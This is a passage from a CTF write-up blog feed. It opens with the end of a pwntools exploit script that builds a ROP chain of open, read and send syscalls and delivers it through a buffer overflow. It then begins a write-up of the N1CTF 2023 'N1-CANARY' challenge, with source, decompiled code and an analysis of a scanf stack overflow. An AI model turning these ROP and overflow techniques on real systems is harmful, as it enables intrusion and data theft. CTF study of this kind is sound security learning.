</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(mov_rdi_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(syscall)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(xchg_edi_eax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(syscall)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rcx_rbx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0xb</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">44</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(syscall)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x500</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p64(leak)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>pl
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embraceaaa&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title>N1CTF 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/n1ctf-2023/</link>
      <pubDate>Tue, 24 Oct 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/n1ctf-2023/</guid>
      <description><![CDATA[<h1 id="introduction">Introduction</h1>
<p>Rating weight: 97,33</p>
<p>During weekends, I played the N1CTF contest with my teammate <code>cauca</code>. We ranked in the top 45 and I solved 1/4 of the problems in the <code>PWN</code> category.</p>
<p><img src="https://hackmd.io/_uploads/Byh_XerIT.png" alt="image"></p>
<h1 id="n1-canary">N1-CANARY</h1>
<p>After the contest, I asked the author for the source of the challenge to make it easier to debug.
<code>main.cpp</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;sys/random.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utils.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;memory&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">constexpr</span> size_t CANARY_RANDBITS <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> size_t CANARY_SHIFTBITS <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> size_t CANARY_POOL_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> CANARY_RANDBITS;
</span></span><span style="display:flex;"><span>u64 user_canary[CANARY_POOL_SIZE];
</span></span><span style="display:flex;"><span>u64 sys_canary[CANARY_POOL_SIZE];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>size_t SIZE<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ProtectedBuffer</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[SIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  u64 canary;
</span></span><span style="display:flex;"><span>  ProtectedBuffer() {
</span></span><span style="display:flex;"><span>    bzero(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> getCanary();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  u64 <span style="color:#a6e22e">getCanary</span>() {
</span></span><span style="display:flex;"><span>    u64 addr <span style="color:#f92672">=</span> (u64)<span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>    u64 canary_idx <span style="color:#f92672">=</span> (addr <span style="color:#f92672">&gt;&gt;</span> CANARY_SHIFTBITS) <span style="color:#f92672">&amp;</span> (CANARY_POOL_SIZE <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    u64 raw_canary <span style="color:#f92672">=</span> user_canary[canary_idx] <span style="color:#f92672">^</span> sys_canary[canary_idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> raw_canary;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> getCanary()) {
</span></span><span style="display:flex;"><span>      raise(<span style="color:#e6db74">&#34;*** stack smash detected ***&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> Fn<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">void</span> mut(Fn <span style="color:#66d9ef">const</span> <span style="color:#f92672">&amp;</span>fn) {
</span></span><span style="display:flex;"><span>    fn(buf);
</span></span><span style="display:flex;"><span>    check();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_canary</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(sys_canary) <span style="color:#f92672">!=</span> getrandom(sys_canary, <span style="color:#66d9ef">sizeof</span>(sys_canary), <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;canary init error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;To increase entropy, give me your canary&#34;</span>);
</span></span><span style="display:flex;"><span>  readall(user_canary);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UnsafeApp</span> {
</span></span><span style="display:flex;"><span>  UnsafeApp() { puts(<span style="color:#e6db74">&#34;creating dangerous app...&#34;</span>); }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>UnsafeApp() {}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">launch</span>() <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">BOFApp</span> <span style="color:#f92672">:</span> UnsafeApp {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">launch</span>() <span style="color:#66d9ef">override</span> {
</span></span><span style="display:flex;"><span>    ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span> buf;
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;input something to pwn :)&#34;</span>);
</span></span><span style="display:flex;"><span>    buf.mut([](<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p) { scanf(<span style="color:#e6db74">&#34;%[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, p); });
</span></span><span style="display:flex;"><span>    puts(buf.buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">backdoor</span>() { system(<span style="color:#e6db74">&#34;/readflag&#34;</span>); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdout, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  init_canary();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> app <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">-&gt;</span>launch();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (...) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;error!!!&#34;</span>);
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>utils.h</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#pragma once
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdexcept&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> u64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">raise</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg) {
</span></span><span style="display:flex;"><span>  puts(msg);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">throw</span> std<span style="color:#f92672">::</span>runtime_error(msg);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readall</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr, size_t size) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)ptr;
</span></span><span style="display:flex;"><span>  size_t tot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (tot <span style="color:#f92672">&lt;</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> res <span style="color:#f92672">=</span> read(STDIN_FILENO, p <span style="color:#f92672">+</span> tot, size <span style="color:#f92672">-</span> tot);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (res <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>      raise(<span style="color:#e6db74">&#34;IO error&#34;</span>);
</span></span><span style="display:flex;"><span>    tot <span style="color:#f92672">+=</span> res;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> T<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> readall(T <span style="color:#f92672">&amp;</span>dest) {
</span></span><span style="display:flex;"><span>  readall(<span style="color:#f92672">&amp;</span>dest, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The author of the challenge has implemented a custom canary, as the title suggests.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_canary</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(sys_canary) <span style="color:#f92672">!=</span> getrandom(sys_canary, <span style="color:#66d9ef">sizeof</span>(sys_canary), <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;canary init error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;To increase entropy, give me your canary&#34;</span>);
</span></span><span style="display:flex;"><span>  readall(user_canary);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In main function, an object was actually instantiated and other subsequent functions were called.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  setbuf(_bss_start, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  init_canary();
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>(v5);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">-&gt;</span>(v5);
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16LL</span>))(v3);
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::~</span>unique_ptr(v5);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I have located the destructor for this object, which will invoke the function pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> a2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a2 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)a2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8LL</span>))(a2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The main function will invoke the <code>BOFApp::launch</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> BOFApp<span style="color:#f92672">::</span>launch(BOFApp <span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> v2; <span style="color:#75715e">// [rsp+1Fh] [rbp-61h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">88</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-60h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+78h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>ProtectedBuffer(s);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;input something to pwn :)&#34;</span>);
</span></span><span style="display:flex;"><span>  ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(s, <span style="color:#f92672">&amp;</span>v2);
</span></span><span style="display:flex;"><span>  puts(s);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span></code></pre></div><p>It&rsquo;s look safe, we continue in mut function, it take a function as a argument</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_int64 <span style="color:#66d9ef">__fastcall</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span>()(a2, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check(a1);
</span></span><span style="display:flex;"><span>}    
</span></span></code></pre></div><h2 id="vulnerability">Vulnerability</h2>
<p>Through debugging, we can see that there is a stack overflow vulnerability in the function that was called because it calls to <code>scanf(&quot;%[^\n]&quot;, p)</code> and doesn&rsquo;t check the boundary</p>
<p>But it isn&rsquo;t easy to use a normal BOF attack, because it calls the function  <code>ProtectedBuffer&lt;64ul&gt;:: check(a1)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">__fastcall</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check(<span style="color:#66d9ef">__int64</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bool</span> result; <span style="color:#75715e">// al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">72</span>);
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> v1 <span style="color:#f92672">!=</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>getCanary(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( result )
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;*** stack smash detected ***&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we cannot bypass this, it will trigger a stack smash error. We&rsquo;ll address it later.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">backdoor</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> system(<span style="color:#e6db74">&#34;/readflag&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I see a <code>backdoor</code> function. How can we call it without bypassing the canary?</p>
